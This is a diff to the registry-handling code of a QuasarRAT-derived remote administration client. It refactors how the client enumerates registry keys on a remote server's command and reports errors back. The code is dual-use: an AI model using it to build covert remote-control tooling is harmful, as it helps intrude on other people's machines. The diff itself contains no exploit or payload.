@@ -5,6 +5,8 @@ using System.Text;
 using xClient.Core.Networking;
 using xClient.Core.Registry;
 using xClient.Core.Extensions;
+using Microsoft.Win32;
+using System.Threading;
 
 namespace xClient.Core.Commands
 {
@@ -16,9 +18,8 @@ namespace xClient.Core.Commands
      * modified partially.
      * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      * Modified by StingRaptor on January 21, 2016
+     * Modified by StingRaptor on March 15, 2016
      * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-     * Original Source:
-     * https://github.com/quasar/QuasarRAT/blob/regedit/Client/Core/Commands/RegistryHandler.cs
      */
 
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE REGISTRY. */
@@ -27,33 +28,22 @@ namespace xClient.Core.Commands
 
         public static void HandleGetRegistryKey(xClient.Core.Packets.ServerPackets.DoLoadRegistryKey packet, Client client)
         {
+            xClient.Core.Packets.ClientPackets.GetRegistryKeysResponse responsePacket = new Packets.ClientPackets.GetRegistryKeysResponse();
             try
             {
+                RegistrySeeker seeker = new RegistrySeeker();
+                seeker.BeginSeeking(packet.RootKeyName);
 
-                seeker = new RegistrySeeker();
-
-                xClient.Core.Packets.ClientPackets.GetRegistryKeysResponse responsePacket = new Packets.ClientPackets.GetRegistryKeysResponse();
-
-                seeker.SearchComplete += (object o, SearchCompletedEventArgs e) =>
-                {
-                    responsePacket.Matches = e.Matches.ToArray();
-                    responsePacket.RootKey = packet.RootKeyName;
-
-                    responsePacket.Execute(client);
-                };
-
-                // If the search parameters of the packet is null, the server is requesting to obtain the root keys.
-                if (packet.RootKeyName == null)
-                {
-                    seeker.Start(new RegistrySeekerParams(null));
-                }
-                else
-                {
-                    seeker.Start(packet.RootKeyName);
-                }
+                responsePacket.Matches = seeker.Matches;
+                responsePacket.IsError = false;
             }
-            catch
-            { }
+            catch (Exception e)
+            {
+                responsePacket.IsError = true;
+                responsePacket.ErrorMsg = e.Message;
+            }
+            responsePacket.RootKey = packet.RootKeyName;
+            responsePacket.Execute(client);
         }
 
         #region Registry Key Edit
@@ -74,7 +64,7 @@ namespace xClient.Core.Commands
             }
             responsePacket.ErrorMsg = errorMsg;
 
-            responsePacket.Match = new RegSeekerMatch(newKeyName, new List<RegValueData>(), 0);
+            responsePacket.Match = new RegSeekerMatch(newKeyName, null, 0);
             responsePacket.ParentPath = packet.ParentPath;
 
             responsePacket.Execute(client);
